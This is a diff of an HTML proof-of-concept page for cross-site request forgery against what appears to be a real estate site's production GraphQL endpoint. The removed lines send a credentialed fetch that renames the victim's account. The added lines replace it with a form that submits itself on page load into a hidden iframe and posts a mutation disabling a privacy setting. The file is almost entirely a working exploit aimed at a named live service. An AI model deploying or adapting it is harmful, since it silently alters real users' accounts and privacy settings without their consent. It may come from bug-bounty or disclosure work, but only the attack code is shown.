@@ -2,49 +2,34 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>CSRF PoC - GraphQL JSON</title>
+  <title>Pure CSRF PoC (Form)</title>
 </head>
-<body>
-  <h3>CSRF PoC (GraphQL JSON) - Manual Submit</h3>
-  <button onclick="exploit()">Exploit</button>
+<body onload="document.getElementById('csrfForm').submit();">
+  <h3>Pure CSRF PoC — auto-submit form</h3>
 
-  <pre id="result"></pre>
+  <iframe name="hidden_iframe" style="display:none;"></iframe>
 
-  <script>
-    function exploit() {
-      const url = "https://mexa.realestate.com.au/graphql";
-      const payload = {
-        operationName: "UpdatePersonalDetails",
-        query: `mutation UpdatePersonalDetails($input: personalDetailsInput!) {
-          updatePersonalDetails(input: $input) {
-            firstName
-            lastName
-            __typename
-          }
-        }`,
-        variables: {
-          input: { firstName: "admin", lastName: "nalla" }
+  <form id="csrfForm"
+        action="https://mexa.realestate.com.au/graphql"
+        method="POST"
+        target="hidden_iframe"
+        enctype="application/x-www-form-urlencoded">
+
+    <input type="hidden" name="operationName" value="DisablePrivacySettingQuery">
+
+    <input type="hidden" name="query"
+      value='mutation DisablePrivacySettingQuery($groupId: PrivacyGroupId!) {
+        disablePrivacySetting(groupId: $groupId) {
+          groupId
+          enabled
+          __typename
         }
-      };
+      }'>
 
-      fetch(url, {
-        method: "POST",
-        credentials: "include",   // send victim's cookies
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-      })
-      .then(r => r.text())
-      .then(text => {
-        document.getElementById("result").textContent =
-          "Exploit sent.\nResponse:\n" + text;
-      })
-      .catch(err => {
-        document.getElementById("result").textContent =
-          "Error: " + err;
-      });
-    }
-  </script>
+    <input type="hidden" name="variables"
+      value='{"groupId":"SUGGESTED_PROPERTIES"}'>
+
+    <noscript><input type="submit" value="Submit manually"></noscript>
+  </form>
 </body>
 </html>
